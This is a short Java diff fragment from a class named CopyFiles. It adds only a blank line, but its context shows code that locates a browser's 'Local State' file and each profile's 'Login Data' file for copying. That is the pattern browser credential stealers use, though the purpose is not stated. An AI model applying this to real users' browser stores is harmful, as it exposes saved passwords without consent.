@@ -24,6 +24,7 @@ public class CopyFiles {
 
         File directory = createDirectory(browserName);
         Path localStateCopy = Path.of(directory + "/Local State");
+
         for (Path profile : profiles) {
 
             Path loginData = Path.of(profile + "/Login Data");
